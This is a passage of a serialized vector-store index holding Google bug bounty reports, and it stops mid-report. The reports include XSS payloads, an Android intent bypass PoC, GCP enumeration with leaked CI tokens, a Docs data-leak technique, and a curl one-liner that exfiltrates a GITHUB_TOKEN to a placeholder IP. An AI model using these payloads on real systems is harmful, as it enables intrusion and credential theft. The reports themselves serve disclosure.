"TextNode"}, "__type__": "1"}, "f793371b-6e48-4022-8025-02ff712e2bd5": {"__data__": {"id_": "f793371b-6e48-4022-8025-02ff712e2bd5", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175714_936043.clean.txt", "file_name": "20250408_175714_936043.clean.txt", "file_type": "text/plain", "file_size": 660, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "15d6558f-b573-497d-bf1c-958cc813c5e9", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175714_936043.clean.txt", "file_name": "20250408_175714_936043.clean.txt", "file_type": "text/plain", "file_size": 660, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "66bee1956c32730b09669095cf45dc10efb4886b1d5e423f4802a24c624327a1", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nStored XSS Via Project Name\r\nProduct:\r\nhttps://games.withgoogle.com/\r\nURL:\r\nVulnerability type:\r\nCross-site scripting (XSS)\r\nDetails\r\nSummary\r\nWhen solve the quiz, i just figured in project name not filter input from user and leads to Stored XSS Vulnerability\r\nStep to reproduce\r\nGo to\r\nhttps://games.withgoogle.com/prepareforlaunch\r\nClick \"Launch Quiz\" Button\r\nFill project name with XSS payload\r\n\"><img src=x onerror=prompt(document.domain)>\r\nFinish the quiz, and in the end the XSS will be triggered\r\nAttack scenario\r\nAttacker can share the URL to affected other people\r\nPlanned disclosure date:\r\nSat Sep 25 2021 00:00:00 GMT+0700 (Indochina Time)", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 660, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "9c0c1d4d-eed5-4b8b-b11a-c225f45d907a": {"__data__": {"id_": "9c0c1d4d-eed5-4b8b-b11a-c225f45d907a", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175645_017204.clean.txt", "file_name": "20250408_175645_017204.clean.txt", "file_type": "text/plain", "file_size": 3207, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "eae5884d-40ad-4523-896f-01fbc5006c06", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175645_017204.clean.txt", "file_name": "20250408_175645_017204.clean.txt", "file_type": "text/plain", "file_size": 3207, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "cb07355df6468c150147c6e3c3211868ec76e2c0836b0bbe7dd550d4393c2329", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nChrome BROWSABLE intent:// bypass\r\nProduct:\r\nURL:\r\nhttps://play.google.com/store/apps/details?id=com.google.android.googlequicksearchbox\r\nVulnerability type:\r\nSandbox Escape\r\nDetails\r\nI created a chromium bug for this, please CC [REDACTED_EMAIL] \"it might be more straightforward to allowlist URIs we redirect to instead of blocking problematic ones.\"\r\nhttps://issuetracker.google.com/331834518\r\nonclick = () => {\r\nconst target = 'intent://<some non-browsable intent>';\r\nconst title = '<h1>Click the button to continue...</h1><p1> :)</p1>';\r\nlocation.href = 'intent://arvr.google.com/scene-viewer/1.2?file=https%3A%2F%2Fstorage.googleapis.com%2Far-answers-in-search-models%2Fstatic%2FMallardDuck%2Fmodel.glb&title=' + encodeURIComponent(title) + '&link=' + encodeURIComponent(target) + '#Intent;package=com.google.android.googlequicksearchbox;scheme=https;end';\r\n}\r\nOn an Android device replace <some non-browsable intent> with some non-browsable intent this could look like\r\nintent://foo#Intent;package=com.example.myapplication;scheme=bar;end\r\nThe host \"foo\" is displayed to the user.\r\nA host is an optional intent parameter.\r\nPutting an attacker controlled intent into startActivity() without sanitization.\r\nBottomViewGroup.java\r\nprivate void openLink(Uri uri) {\r\nUri outboundLink = UriUtilities.getOutboundLink(uri);\r\nif (outboundLink != null) {\r\nif (INTENT_SCHEME.equals(outboundLink.getScheme())) {\r\ntry {\r\nIntent parseUri = Intent.parseUri(outboundLink.toString(), 1);\r\nif (parseUri != null) {\r\ngetContext().startActivity(parseUri);\r\n} catch (URISyntaxException e) {\r\n((hoch) ((hoch) ((hoch) logger.d()).g(e)).aa(41236)).p(\"Failed to parse intent URI\");\r\n} else {\r\nViewerLogger.getInstance().logAction(ArViewerLogEnumOuterClass.ArViewerLogEnum.Action.OPEN_LINK);\r\n((hoch) ((hoch) logger.c()).aa(41235)).s(\"Opening link: %s\", outboundLink);\r\nnew ast().a().a(getContext(), outboundLink);\r\nUriUtilities.java\r\npublic static Uri getOutboundLink(Uri uri) {\r\nif (uri == null) {\r\nreturn null;\r\nreturn uri.buildUpon().appendQueryParameter(UTM_SOURCE_PARAMETER, UTM_SOURCE_VALUE).build();\r\nAttack scenario\r\nA website is able to send intents that are not marked as android.intent.category.BROWSABLE\r\nhttps://developer.android.com/reference/android/content/Intent#CATEGORY_BROWSABLE\r\nThis is an attack known as\r\nhttps://developer.android.com/privacy-and-security/risks/intent-redirection\r\nits recommended to only launch untrusted intents with the opt-in CATEGORY, chromium would normally have done this but this app bypasses the protection via a tap of a button.\r\nAnd since\r\ntitle\r\nsupports basic html its possible to make it clear that button should be tapped.\r\nThis also acts as a bypass to\r\nhttps://issues.chromium.org/40060327\r\nas shown in\r\nhttps://drive.google.com/open?id=1ccNnVavSY2rg1cG5r7IMfdSC9XDHCYMA&authuser=0\r\nNOT ABOUT THE OPEN REDIRECT\r\nThe problem is that a different browser can be outdated and contain security issues that don't exist or where since patched in chrome.\r\nI felt like this issue needed more then a comment to explain.\r\n\"This seems to be an issue with the AR scene viewer rather than Chrome, since if I understand correctly it is (correctly) handling this intent to it.\"", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3207, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "102e2008-bafc-4bd1-9153-d7a3055497e5": {"__data__": {"id_": "102e2008-bafc-4bd1-9153-d7a3055497e5", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_532246.clean.txt", "file_name": "20250408_175719_532246.clean.txt", "file_type": "text/plain", "file_size": 1373, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "c61c5140-4be8-4bd3-8ab4-5439ff3c468f", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_532246.clean.txt", "file_name": "20250408_175719_532246.clean.txt", "file_type": "text/plain", "file_size": 1373, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "5486b6b260466824576beac419f706576f7cc3bc49ff5dc021eddf52f45d4897", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: Invited user can signup with restricted Oauth example: google, dropbox\r\nDescription: It has been identified on the appsheet.com main domain, we have an ability to invite the user, Here the owner can set the rule of Oauth or we can say that admin can restrict the user from which Oauth they are sign in for example, admin can set the signup with dropbox only.. so the user will receive the invitation with the dropbox link only, but due to the misconfiguration in the application, a user can  also specify the oauth by just changing the parameter\r\nExample: if the admin has set the Oauth only to google, Here user can signup with dropbox, apple and other provider\r\nStep to Reproduce\r\nSignup on appsheet.com as admin\r\nGoto user tab\r\nType user email\r\nIn the authentication provider select  as apple and invite the user\r\nUser receives the link of invitation\r\nUser sees the authentication is only apple\r\nNow user tamper the provider parameter and rename it to google,or dropbox\r\nnow he can signup with google and other provider as well\r\nAttack scenario:\r\nWe can see this rule is clearly violating the admin permission rules, Or we can say that this escalating the bit of permission of admin rules\r\nSupporting video poc\r\nhttps://drive.google.com/file/d/18z_DRW8qCvf4jwVDc4DaNBBhi5XcWXKx/view\r\nAcquisition info:\r\nIt was acquired by google on  14 jab 2020     appsheet.com", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1373, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "cf53c8e3-c83f-46d2-8e3c-58db88aa0f23": {"__data__": {"id_": "cf53c8e3-c83f-46d2-8e3c-58db88aa0f23", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_466234.clean.txt", "file_name": "20250408_175703_466234.clean.txt", "file_type": "text/plain", "file_size": 749, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "2e442269-5031-4c17-af2e-8b6741e85195", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_466234.clean.txt", "file_name": "20250408_175703_466234.clean.txt", "file_type": "text/plain", "file_size": 749, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "834925c148d24b10f7d375deb674925e9804d06f6b3fed00b2fa8f721f8439ba", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nXSS on\r\nhttps://security-test-ari76op.uc1.ccaiplatform.com\r\nProduct:\r\nGoogle Cloud\r\nURL:\r\nhttps://security-test-ari76op.uc1.ccaiplatform.com/agent/?type=popup&popup=cobrowse&cobrowseDomain=javascript:alert(window.origin);%2F%2F\r\nVulnerability type:\r\nCross-site scripting (XSS)\r\nDetails\r\nlet f = document.createElement('iframe');\r\nf.hidden = true;\r\nf.src = 'https://security-test-ari76op.uc1.ccaiplatform.com/agent/?type=popup&popup=cobrowse&cobrowseDomain=javascript:alert(window.origin);%2F%2F';\r\ndocument.body.appendChild(f);\r\nWait a \"small\" amount of time for alert to happen.\r\nAttack scenario\r\nAny website can get XSS on Contact Center AI.\r\n(I dont know much about it not created an account yet)\r\nFound as part of grant issue 258419050", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 749, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "addc2515-350a-47e7-8260-43aff8e7b221": {"__data__": {"id_": "addc2515-350a-47e7-8260-43aff8e7b221", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_772653.clean.txt", "file_name": "20250408_175658_772653.clean.txt", "file_type": "text/plain", "file_size": 5078, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "2e5d3d56-8713-4da4-8a37-f6c133ea36fd", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_772653.clean.txt", "file_name": "20250408_175658_772653.clean.txt", "file_type": "text/plain", "file_size": 5078, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "ee627c97bcaf5946b671b33637d80210759abe5950b7ae2bff547fdf5aa31f03", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "a8852d4c-2584-4bf0-8b2b-48e4ee4d2862", "node_type": "1", "metadata": {}, "hash": "f76787d2dbf2a3e074930a6100aceb77d449898d03b35b9766edfbc9d8832fba", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nInternal GCP Access - GoogleCloudPlatform/magic-modules\r\nProduct:\r\nGoogle OSS (open source software)\r\nURL:\r\nhttps://github.com/GoogleCloudPlatform/magic-modules/\r\nVulnerability type:\r\nRemote Code Execution (RCE)\r\nDetails\r\nHi team,\r\nRaising a malicious PR on internet can leak out access tokens which allows for backend GCP enumeration of resource being used by the build systems.\r\nSteps :-\r\nRaise a PR (Exploit PR in this case :\r\nhttps://github.com/GoogleCloudPlatform/magic-modules/pull/7228\r\n)\r\nWait for Access tokens to be retrived and we see that these access tokens are valid for multiple projects\r\n[root@ip-172-31-86-82 ~]# gcloud --access-token-file /tmp/token projects list\r\nPROJECT_ID                   NAME                         PROJECT_NUMBER\r\nci-bq-external-data-project  ci-bq-external-data-project  821080836656\r\nci-gke-43e65a86-495d         ci-gke-43e65a86              76432828804\r\nci-gsuite-sa-project         ci-gsuite-sa-project         1013948302907\r\nci-media-cdn-vod-project     ci-media-cdn-vod-project     979258774428\r\nci-terraform-validator-fef2  ci-terraform-validator       998476993360\r\nci-vm-module-2c6c            ci-vm-module                 1009530108401\r\nci-vm-module-87bd            ci-vm-module                 188723441739\r\nf12debc7e5c0087c5p-tp        f12debc7e5c0087c5p-tp        348315023304\r\ngraphite-docker-images       graphite-docker-images       673497134629\r\nNow we simply enumerate\r\nAttack scenario\r\nEnumeration done so far :-\r\n[root@ip-172-31-86-82 ~]# gcloud --project ci-gke-43e65a86-495d --access-token-file /tmp/token compute instances list\r\nNAME                                                 ZONE           MACHINE_TYPE   PREEMPTIBLE  INTERNAL_IP  EXTERNAL_IP     STATUS\r\ngke-simple-zonal-cluste-acm-node-pool-68bcad25-4lzr  us-central1-a  e2-standard-4               10.0.0.4     34.170.211.41   RUNNING\r\ngke-simple-zonal-cluste-acm-node-pool-68bcad25-7d2r  us-central1-a  e2-standard-4               10.0.0.6     104.154.79.164  RUNNING\r\ngke-simple-zonal-cluste-acm-node-pool-68bcad25-np60  us-central1-a  e2-standard-4               10.0.0.5     34.67.29.131    RUNNING\r\ngke-simple-zonal-cluste-acm-node-pool-68bcad25-v0m9  us-central1-a  e2-standard-4               10.0.0.3     34.71.202.178   RUNNING\r\nsafer-cluster-iap-bastion-bastion                    us-central1-a  g1-small                    10.10.10.2                   RUNNING\r\n[root@ip-172-31-86-82 ~]# gcloud --project ci-gke-43e65a86-495d --access-token-file /tmp/token container clusters list\r\nNAME                  LOCATION       MASTER_VERSION  MASTER_IP      MACHINE_TYPE   NODE_VERSION      NUM_NODES  STATUS\r\nsimple-zonal-cluster  us-central1-a  1.24.7-gke.900  35.224.32.156  e2-standard-4  1.24.5-gke.600 *  4          RUNNING\r\n* - There is an upgrade available for your cluster(s).", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2823, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "a8852d4c-2584-4bf0-8b2b-48e4ee4d2862": {"__data__": {"id_": "a8852d4c-2584-4bf0-8b2b-48e4ee4d2862", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_772653.clean.txt", "file_name": "20250408_175658_772653.clean.txt", "file_type": "text/plain", "file_size": 5078, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "2e5d3d56-8713-4da4-8a37-f6c133ea36fd", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_772653.clean.txt", "file_name": "20250408_175658_772653.clean.txt", "file_type": "text/plain", "file_size": 5078, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "ee627c97bcaf5946b671b33637d80210759abe5950b7ae2bff547fdf5aa31f03", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "addc2515-350a-47e7-8260-43aff8e7b221", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_772653.clean.txt", "file_name": "20250408_175658_772653.clean.txt", "file_type": "text/plain", "file_size": 5078, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "a5c2fbe74b0463c897438e9b1ec1c3a5eb3ab82a68d4ecbc2aedb1b15a9b8796", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "To upgrade nodes to the latest available version, run\r\n$ gcloud container clusters upgrade NAME\r\n[root@ip-172-31-86-82 ~]# gcloud --project ci-bq-external-data-project --access-token-file /tmp/token storage ls\r\ngs://ci-bq-external-data/\r\n[root@ip-172-31-86-82 ~]# gcloud --project ci-bq-external-data-project --access-token-file /tmp/token storage ls gs://ci-bq-external-data/\r\ngs://ci-bq-external-data/bigquery-external-table-test.csv\r\ngs://ci-bq-external-data/hive_partition_example/\r\n[root@ip-172-31-86-82 ~]# gcloud --project ci-bq-external-data-project --access-token-file /tmp/token compute instances list\r\nListed 0 items.\r\n[root@ip-172-31-86-82 ~]# gcloud --project ci-bq-external-data-project --access-token-file /tmp/token iam service-accounts list\r\nDISPLAY NAME                                         EMAIL                                                                        DISABLED\r\nci-bq-external-data-project Project Service Account  project-service-account@ci-bq-external-data-project.iam.gserviceaccount.com  False\r\n[root@ip-172-31-86-82 ~]# gcloud --project ci-bq-external-data-project --access-token-file /tmp/token iam service-accounts keys list --iam-account project-service-account@ci-bq-external-data-project.iam.gserviceaccount.com\r\nKEY_ID                                    CREATED_AT            EXPIRES_AT            DISABLED\r\n496c1979068d16025af9b21dee633ab3a937b81f  2022-11-25T16:03:52Z  2024-11-27T09:05:32Z\r\n[root@ip-172-31-86-82 ~]# gcloud --project ci-gsuite-sa-project --access-token-file /tmp/token storage ls\r\ngs://ci-gsuite-sa-secrets/\r\n[root@ip-172-31-86-82 ~]# gcloud --project ci-gsuite-sa-project --access-token-file /tmp/token storage ls gs://ci-gsuite-sa-secrets/\r\ngs://ci-gsuite-sa-secrets/gsuite-sa.json\r\n[root@ip-172-31-86-82 ~]# gcloud --project graphite-docker-images --access-token-file /tmp/token storage ls\r\ngs://artifacts.graphite-docker-images.appspot.com/\r\ngs://cloud-build-bigquery-notifiers/\r\ngs://cloud-build-chat-notifiers/\r\ngs://gcf-sources-673497134629-us-central1/\r\ngs://graphite-docker-images.appspot.com/\r\ngs://graphite-docker-images_cloudbuild/\r\ngs://staging.graphite-docker-images.appspot.com/\r\ngs://us.artifacts.graphite-docker-images.appspot.com/\r\ngs://vcr-cassettes/\r\ngs://vcr-logs/", "mimetype": "text/plain", "start_char_idx": 2825, "end_char_idx": 5078, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "da5bf6c8-a0a5-4774-a149-a202702d3241": {"__data__": {"id_": "da5bf6c8-a0a5-4774-a149-a202702d3241", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_833802.clean.txt", "file_name": "20250408_175642_833802.clean.txt", "file_type": "text/plain", "file_size": 3268, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "8e40cee6-dfe9-43ba-9f52-2a2623d4d260", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_833802.clean.txt", "file_name": "20250408_175642_833802.clean.txt", "file_type": "text/plain", "file_size": 3268, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "bdd5f28533c3366cfe149f5732df2c2d75be657fc04e1e8912d2925c42b73d58", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nGITHUB_TOKEN leak that gives\r\nissue: write\r\nand\r\nid-token: write\r\npermissions to\r\nGoogleCloudPlatform/alloydb-java-connector\r\nrepository\r\nProgram:\r\nOSS VRP\r\nURL:\r\nhttps://github.com/GoogleCloudPlatform/alloydb-java-connector\r\nVulnerability type:\r\nSensitive data exposure\r\nDetails\r\nDue to users code checkout in\r\nci.yaml\r\nGithub action\r\n, it's possible for an attacker to craft a Pull Request that will contain malicious\r\n.kokoro/build.sh\r\nfile with a script that will be executed at\r\nCheck Coverage\r\nstep\r\nand will extract GITHUB_TOKEN secret that is used for running workflow and has\r\npermissions for the repository.\r\nmore information in the docs:\r\nhttps://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner\r\nDetails:\r\nGithub action is started on Pull Request via\r\nAction can be triggered by\r\npull_request_target:\r\nevent , which does not require approval from the owner of the repo.\r\nHowever,\r\npull_request_target\r\nevent must be\r\n\"labeled\"\r\nSince, there is the\r\nauto-label\r\nbot\r\nenabled\r\nfor this repository, it is possible to craft a PR title, e.g. \"spanner: ignored\" that will be automatically labeled with \"api: spanner\" tag (\r\nDocumentation\r\n) and\r\nevent will be trigered.\r\nAfter that, the code submitted in the PR is checked out at\r\nhttps://github.com/GoogleCloudPlatform/alloydb-java-connector/blob/55e39d9138a5bd9061420307b67a467ddb2b9555/.github/workflows/ci.yaml#L46\r\nwithout\r\npersist-credentials: false\r\nwhich means that GITHUB_TOKEN is stored in the filesystem (\r\nlink\r\n) of the machine that is running the workflow and can be extracted with malicious bash scripts submitted by attacker and executed in the\r\nRun tests\r\nIn most cases it is possible to exfiltrate the\r\nGITHUB_TOKEN\r\nwith the following technique.\r\nfind $HOME/work -type f -name config | xargs cat | curl --data @- http://{IP}\r\nThis works because the\r\nactions/checkout\r\naction\r\npersists credentials with a local git config by default\r\n.\r\nThe supplied\r\nscript is run at\r\nWhich gives opportunity for an attacker to craft a script that will exfiltrate\r\nToken has\r\npermissions\r\nwhich can be used to tamper Issues and Pull Requests, e.g. approve PR or potentially exfiltrate cloud credentials that are used for this repository.\r\nMitigation\r\nAdd\r\nto\r\nCheckout code\r\nstep at\r\nhttps://github.com/GoogleCloudPlatform/alloydb-java-connector/blob/55e39d9138a5bd9061420307b67a467ddb2b9555/.github/workflows/ci.yaml#L44\r\nCheck for specific labels on the PR before running a job, e.g.\r\nhttps://github.com/GoogleCloudPlatform/cloud-sql-proxy/blob/HEAD/.github/workflows/lint.yaml#L26\r\nSupporting Material/References:\r\nhttps://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability\r\nhttps://securitylab.github.com/research/github-actions-preventing-pwn-requests/\r\nhttps://r2c.dev/blog/2021/protect-your-github-actions-with-semgrep/\r\nAttack scenario\r\nThe attack can be triggered by any Github account without interaction with the owner of the repository.\r\nImpact\r\nGITHUB_TOKEN is leaked\r\nAttacker gets write access to Issues and Pull Requests of\r\nrepository, including PR approval.\r\nAttacker gets write access to\r\nid-token\r\nand potentially has opprotunity to get cloud credentials that are used for this repository.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3268, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "63f08283-a108-4a28-8561-b63a134a838d": {"__data__": {"id_": "63f08283-a108-4a28-8561-b63a134a838d", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_072076.clean.txt", "file_name": "20250408_175701_072076.clean.txt", "file_type": "text/plain", "file_size": 3102, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "afd23465-f5dd-43b9-9a17-e686ec676e2d", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_072076.clean.txt", "file_name": "20250408_175701_072076.clean.txt", "file_type": "text/plain", "file_size": 3102, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "ce8fe36c1d6a74692fb62753b6b16e45fde2983dc1a09ad05a6851947563a03a", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nArbitrary sheet linking in Google Docs leads to a convincing one-click data leak\r\nProduct:\r\nGoogle Docs Editors\r\nURL:\r\nhttps://docs.google.com/document/u/0/\r\nVulnerability type:\r\nInformation Leak\r\nDetails\r\nSummary\r\nGoogle Docs has a feature which lets you link/embed any Docs spreadsheet (or slide) inside of a document or slide. By using a web proxy, it is possible for an attacker to link to any spreadsheet, even if they don't have access to it. When someone with access to the spreadsheets visits the attacker's document, they are presented with an \"UPDATE\" button. Clicking the button will fetch the contents of the spreadsheet and include them inside of the document, which the attacker can retrieve.\r\nBasic repro\r\nA basic attack isn't very convincing, but works as a minimal test case:\r\nMake sure you have the id/url of a spreadsheet you don't have access to.\r\nCreate a spreadsheet and copy a part of it to the clipboard.\r\nCreate a document and paste the table you copied, pick the \"Link to spreadsheet\" option.\r\nCapture the POST request to\r\n.../save\r\nusing a web proxy\r\nIn the POST request, find and replace the ID of the spreadsheet your created with the ID of the spreadsheet you are targeting.\r\nShare the document with a person who has access to the target spreadsheet. Upon opening the document, they should see an \"UPDATE\" button, which when clicked will include the data from the spreadsheet inside the document you have access to.\r\nThis repro is also demonstrated in the attached\r\ndemo_basic.webm\r\nvideo.\r\nImproved PoC\r\nGoogle Docs allows for many formatting options that can be used to make this attack more convincing. As a PoC, I made a document where the linked table was moved way off-screen and had extra columns added. An image was added on the table that spoofs a notification asking the user to update the document to see the latest version. The image cannot be selected or moved.\r\nUpon clicking the \"UPDATE\" button, the extra columns with the image will disappear and it seems to the user like they just dismissed a notification, while the document will now contain the spreadsheet data off-screen.\r\nI don't think step-by-step instructions for this scenario are necessary as it is just the basic repro shown above with some creative Docs formatting added to it. This PoC is demonstrated in the attached\r\ndemo_advanced.webm\r\nvideo, the hidden table contents are shown by copy-pasting them into the URL-bar.\r\nPlaying around with this I also found it to be possible to put the entire table outside of the document, leading to a floating \"UPDATE\" button with no context, as can be seen in\r\ndemo_outside.png\r\n.\r\nAttack scenario\r\nA malicious actor that is already aware of a Google Docs spreadsheet (or slide) url/ID can craft a malicious document, which when opened by victim who clicks an \"UPDATE\" button leads to the leak of the targeted spreadsheet or slide.\r\nIn short:\r\nThe attacker needs to know the ID of a private spreadsheet.\r\nThe victim has to open a document and click on a button labeled \"UPDATE\".\r\nThe attacker receives the contents of the private spreadsheet.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3102, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "faf3ff2b-7228-46b3-9d18-d6c2c572847b": {"__data__": {"id_": "faf3ff2b-7228-46b3-9d18-d6c2c572847b", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_182221.clean.txt", "file_name": "20250408_175701_182221.clean.txt", "file_type": "text/plain", "file_size": 3576, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "0493ef12-67e1-4a8f-9468-6dadf00952f7", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_182221.clean.txt", "file_name": "20250408_175701_182221.clean.txt", "file_type": "text/plain", "file_size": 3576, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "82f679a59039476627996f16f1924441b577c3c6ead44d1539dc8d11b8009e52", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nReal-time Support API provides user access to chat transcripts between support agents\r\nProduct:\r\nGoogle Help\r\nURL:\r\nhttps://support.google.com\r\nVulnerability type:\r\nInformation Leak\r\nDetails\r\nUsers receiving support from Google may have their case open for multiple days, and during this time, agents may create chats with other agents to discuss customer issues internally. These chats, as far as I understand, are associated with the original case in the backend, and thereby associated with the reporting user.\r\nLoading a product page on Google Help (for example\r\nGoogle Play Help\r\n) while you have open support cases shows the current status of the cases at the top of the page. This is powered by a request 